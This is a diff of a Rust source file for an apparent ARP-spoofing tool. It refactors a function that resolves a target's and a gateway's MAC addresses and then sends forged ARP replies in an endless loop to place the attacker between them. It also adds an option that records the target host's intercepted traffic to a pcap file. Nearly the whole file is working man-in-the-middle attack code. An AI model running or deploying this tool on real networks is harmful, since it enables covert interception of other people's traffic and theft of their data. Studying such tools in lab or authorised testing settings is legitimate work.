@@ -1,8 +1,13 @@
 use std::mem;
 use std::net::Ipv4Addr;
+use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
 use std::thread;
-use std::time::Duration;
+use std::time::{Duration, Instant};
+
+use pcap::Device;
+
+use crate::utils::{mac_to_string, pcap_open};
 
 #[derive(Debug, Clone)]
 #[repr(C)]
@@ -19,10 +24,6 @@ impl Ethernet {
             source_mac,
             ether_type: u16::to_be(0x0806),
         }
-    }
-
-    pub fn to_raw(&self) -> [u8; 14] {
-        unsafe { mem::transmute_copy::<Ethernet, [u8; 14]>(&self) }
     }
 }
 
@@ -89,61 +90,77 @@ impl ArpHeader {
     }
 
     pub fn to_raw(&self) -> [u8; 42] {
-        unsafe { mem::transmute_copy::<ArpHeader, [u8; 42]>(&self) }
+        unsafe { mem::transmute_copy::<ArpHeader, [u8; 42]>(self) }
     }
 }
 
 pub fn arp_poisoning(
-    cap_ptr: Arc<Mutex<pcap::Capture<pcap::Active>>>,
+    device: Device,
     own_mac_addr: [u8; 6],
     own_ip_addr: Ipv4Addr,
     target_ip: Ipv4Addr,
     gateway_ip: Ipv4Addr,
+    log_traffic: bool,
 ) {
-    let mac_a = resolve_mac_addr(cap_ptr.clone(), own_mac_addr, own_ip_addr, target_ip).unwrap();
-    let mac_b = resolve_mac_addr(cap_ptr.clone(), own_mac_addr, own_ip_addr, gateway_ip).unwrap();
+    println!("[*] Resolving hosts (this can take a bit) ...");
+    let capture = pcap_open(device.clone(), "arp").unwrap();
+    let capture = Arc::new(Mutex::new(capture));
+    let mac_a = resolve_mac_addr(capture.clone(), own_mac_addr, own_ip_addr, target_ip).unwrap();
+    let mac_b = resolve_mac_addr(capture.clone(), own_mac_addr, own_ip_addr, gateway_ip).unwrap();
 
-    let mut packets: Vec<ArpHeader> = Vec::new();
-    packets.push(ArpHeader::new(
-        ArpType::ArpReply,
-        own_mac_addr,
-        target_ip,
-        mac_b,
-        gateway_ip,
-    ));
-    packets.push(ArpHeader::new(
-        ArpType::ArpReply,
-        own_mac_addr,
-        gateway_ip,
-        mac_a,
-        target_ip,
-    ));
+    // Enable traffic logging
+    if log_traffic {
+        let log_cap_filter = format!("host {}", target_ip);
+        let log_file = PathBuf::from("save.pcap");
+        println!("[*] Saving captured packets as {} ...", log_file.display());
+        let mut log_cap = pcap_open(device, &log_cap_filter).unwrap();
+        thread::spawn(move || {
+            log_traffic_pcap(&mut log_cap, &log_file).expect("Unable to write packets to file")
+        });
+    }
 
     println!(
         "[+] Poisoning traffic between {} <==> {}",
         target_ip, gateway_ip
     );
+
+    // packets used for poisoning
+    let packets: Vec<ArpHeader> = vec![
+        ArpHeader::new(
+            ArpType::ArpReply,
+            own_mac_addr,
+            target_ip,
+            mac_b,
+            gateway_ip,
+        ),
+        ArpHeader::new(
+            ArpType::ArpReply,
+            own_mac_addr,
+            gateway_ip,
+            mac_a,
+            target_ip,
+        ),
+    ];
+
+    let mut cap = capture.lock().unwrap();
     loop {
-        let mut cap = cap_ptr.lock().unwrap();
         for p in &packets {
-            match cap.sendpacket(p.to_raw().as_ref()) {
-                Ok(_) => (),
-                Err(e) => println!("Unable to send packet: {}", e),
+            if let Err(e) = cap.sendpacket(p.to_raw().as_ref()) {
+                println!("Unable to send packet: {}", e)
             }
         }
-
         thread::sleep(Duration::from_millis(1500));
     }
 }
 
 /// This function sends an ArpRequest to resolve the mac address for the given ip
 pub fn resolve_mac_addr(
-    cap_ptr: Arc<Mutex<pcap::Capture<pcap::Active>>>,
+    capture: Arc<Mutex<pcap::Capture<pcap::Active>>>,
     own_mac_addr: [u8; 6],
     own_ip_addr: Ipv4Addr,
     ip_addr: Ipv4Addr,
 ) -> Option<[u8; 6]> {
-    let scoped_cap_ptr = cap_ptr.clone();
+    let scoped_capture = capture.clone();
     // Spawn new thread to capture ArpReply
     let join_handle = thread::spawn(move || {
         let max_fails = 4;
@@ -151,24 +168,22 @@ pub fn resolve_mac_addr(
 
         loop {
             if fail_counter >= max_fails {
-                println!("{} seems to be offline", ip_addr);
+                println!(" -> {} seems to be offline", ip_addr);
                 return None;
             }
-            let mut cap = scoped_cap_ptr.lock().unwrap();
-            match cap.next() {
+            let mut cap = scoped_capture.lock().unwrap();
+            match cap.next_packet() {
                 Ok(packet) => {
                     let arp_header = ArpHeader::from_raw(packet.data).unwrap();
-                    if arp_header.op_code == u16::to_be(0x2)
-                        && ip_addr
-                            == Ipv4Addr::new(
-                                arp_header.source_ip[0],
-                                arp_header.source_ip[1],
-                                arp_header.source_ip[2],
-                                arp_header.source_ip[3],
-                            )
-                    {
+                    let dest_ip = Ipv4Addr::new(
+                        arp_header.source_ip[0],
+                        arp_header.source_ip[1],
+                        arp_header.source_ip[2],
+                        arp_header.source_ip[3],
+                    );
+                    if arp_header.op_code == u16::to_be(0x2) && ip_addr == dest_ip {
                         println!(
-                            "Found {} at {}",
+                            " -> found {} at {}",
                             mac_to_string(&arp_header.source_mac),
                             ip_addr
                         );
@@ -190,39 +205,35 @@ pub fn resolve_mac_addr(
 
     // Send some ArpRequests
     for _ in 0..10 {
-        let mut cap = cap_ptr.lock().unwrap();
-        match cap.sendpacket(crafted.to_raw().as_ref()) {
-            Ok(_) => (),
-            Err(e) => panic!("[!] Unable to send packet: {}", e),
+        let mut cap = capture.lock().unwrap();
+        if let Err(e) = cap.sendpacket(crafted.to_raw()) {
+            panic!("[!] Unable to send packet: {}", e);
         }
         thread::sleep(Duration::from_millis(25));
     }
     join_handle.join().unwrap()
 }
 
-pub fn mac_to_string(mac_addr: &[u8; 6]) -> String {
-    mac_addr
-        .iter()
-        .map(|b| format!("{:02X}", b))
-        .collect::<Vec<String>>()
-        .join(":")
-}
+/// Logs traffic to the given pcap file and prints a short network statistic
+pub fn log_traffic_pcap(
+    cap: &mut pcap::Capture<pcap::Active>,
+    log_file: &Path,
+) -> Result<(), pcap::Error> {
+    let mut savefile = cap.savefile(log_file)?;
 
-pub fn string_to_mac(string: String) -> [u8; 6] {
-    let hx: Vec<u8> = string
-        .split(':')
-        .map(|b| u8::from_str_radix(b, 16).unwrap())
-        .collect();
-    if hx.len() != 6 {
-        panic!(
-            "string_to_mac: mac address octet length is invalid: {}",
-            string
-        );
+    let mut last_print = Instant::now();
+    let print_threshold = Duration::from_secs(15);
+    loop {
+        let packet = cap.next_packet()?;
+        savefile.write(&packet);
+        savefile.flush()?;
+        if last_print.elapsed() > print_threshold {
+            let stats = cap.stats()?;
+            println!(
+                "\r[*] Received: {}, dropped: {}, if_dropped: {}",
+                stats.received, stats.dropped, stats.if_dropped
+            );
+            last_print = Instant::now()
+        }
     }
-
-    let mut mac_addr = [0u8; 6];
-    for (&x, p) in hx.iter().zip(mac_addr.iter_mut()) {
-        *p = x;
-    }
-    mac_addr
 }
